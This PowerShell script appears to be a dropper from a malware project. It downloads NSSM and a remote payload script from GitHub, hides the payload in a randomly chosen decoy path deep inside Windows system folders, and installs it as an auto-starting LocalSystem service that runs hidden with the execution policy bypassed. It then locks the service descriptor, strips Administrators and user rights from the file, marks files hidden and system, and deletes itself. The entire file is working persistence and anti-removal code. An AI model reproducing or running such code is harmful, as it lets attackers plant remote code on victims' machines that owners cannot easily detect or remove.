param(
    [string]$basePath
)
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]

$paths =  @(
    "$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta","$env:windir\Microsoft.NET\assembly\GAC_MSIL\PolicyCache\v4.0_Subscription\en-US\Resources\Temp","$env:windir\Microsoft.NET\assembly\GAC_64\PolicyCache\v4.0_Subscription\en\Temp\ShadowCopy","$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload", "$env:windir\Resources\Themes\Cursors\Backup\MicrosoftStore","$env:windir\System32\Tasks\Microsoft\Windows\PLA\System\Diagnostics\ETL\Traces\Archived","$env:windir\System32\DriverStore\FileRepository\netrndis-inf_amd64_abcd1234efgh5678\ConfigBackup",($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),($env:systemdrive + "\Recovery"),"$env:ProgramData\Microsoft\WindowsDefender\Platform\Config\MpEngine\Quarantine\Volatile","$env:ProgramData\Microsoft\EdgeCore\modules\stable_winupdate_aux\cache\media_metrics\prefetch","$env:ProgramData\Microsoft\Windows\AppRepository\StateCache\CacheIndex\Staging\DriverStore","$env:ProgramData\Microsoft\Edge\DevTools\HeapSnapshots\Cache\IndexedDB\dump","$env:ProgramData\Microsoft\Diagnosis\DownloadedSettings\Symbols\Public\CrashDump","$env:windir\system32\spool\drivers\x64\3\en-US","$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls","$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642","$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces","$env:windir\WinSxS\amd64_netfx4-fusion-dll-b03f5f7f11d50a3a_4015840_none_19b5d9c7ab39bf74\microsoft\windows\servicingstack\Temp\Symbols\Debug","$env:windir\WinSxS\Manifests\x86_microsoft_windows_servicingstack_31bf3856ad364e35\Backup\Analytics\Cache","$env:windir\WinSxS\Catalogs\Index\Staging\DriverCache\ShadowCopy\Microsoft\Windows\Tasks\Services\Minidump","$env:windir\WinSxS\Manifests\amd64_abcdef0123456789_manifest\microsoft\windows\ProgramCache\ShadowCopy\Universal\Debug\Logs","$env:windir\WinSxS\Manifests\wow64_microsoft-windows-ability-assistant-db-31bf3856ad364e35_10_0_19041_4597_none_c873f8fba7f2e1a5\ProgramData\Ammnune\Acids\Backups\Logs\Recovery\SelectedFiles","$env:windir\WinSxS\Temp\Microsoft\Windows\Logs\Dump\CrashReports","$env:windir\WinSxS\ManifestCache\x86_netfx35linq_fusion_dll_b03f5f7f11d50a3a_4015840_cache","$env:windir\WinSxS\ManifestCache\x86_microsoft-windows_servicingstack_31bf3856ad364e35_100190413636_none_9ab8d1c1a1a8a1f0\ServiceStack\Programs\Updates","$env:windir\WinSxS\ManifestCache\amd64_microsoft-windows-aence-mitigations-c1_31bf3856ad364e35-100226212506_none_9a1f2d8e1d4c3f07","$env:windir\WinSxS\ManifestCache\x86_microsoft-windows-sgstack-servicingapi_31bf3856ad364e35_100190413636_none_0c8e1a1d3d0b0a1f","$env:windir\WinSxS\Backup\KB5034441_amd64_1234567890abcdef","$env:windir\WinSxS\Backup\wow64_microsoft-windows-ued-telemetry-client_31bf3856ad364e35_100226212506_none_1b3f8c7f1a9d0d42","$env:windir\WinSxS\Backup\amd64_netfx4-mscordacwks_b03f5f7f11d50a3a_4015744161_none_1a2b3c4d5e6f7d89","$env:windir\WinSxS\Backup\x86_presentationcore_31bf3856ad364e35_61760117514_none_49d7b7f5b8f0b0d5","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Logs\Backup\Temp","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\Caches\CRMDatabase\Index"
)
$curr = $MyInvocation.MyCommand.Path
$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
if($arch -eq "64-bit"){
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
}else{
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
}
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$fwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$fwdmonPath = "$fwdmonPath\fwd_mon.ps1"

$serviceName = "Disenfranchise"
$childServiceName = "Vanguard"
$childServicePropertyName = "fwd"
$exepath = "powershell.exe"
$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath '$basePath' -exe '$nssmexe' -childServiceName $childServiceName -childServicePropertyName $childServicePropertyName"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    iwr -Uri $nssmUrl -OutFile $nssmexe
}

if(-not(Test-Path -Path $fwdmonPath -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fwd_mon.ps1" -OutFile $fwdmonPath
}

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\fwdmon_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\fwdmon_srv.log.error"
& $nssmexe start $serviceName

Start-Sleep -Seconds 3
$user = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $fwdmonPath
icacls $fwdmonPath /inheritance:r /Q 
icacls $fwdmonPath /grant:r "$($user):F" "NT AUTHORITY\SYSTEM:F" /Q 
icacls $fwdmonPath /setowner "NT AUTHORITY\SYSTEM" /Q 
icacls $fwdmonPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 
icacls $fwdmonPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 
icacls $fwdmonPath /remove "$user" /Q 

attrib +h +s +r $nssmFolder 2>&1 | Out-Null
attrib +h +s +r $fwdmonPath 2>&1 | Out-Null

Remove-Item -Path $curr -Force -ErrorAction SilentlyContinue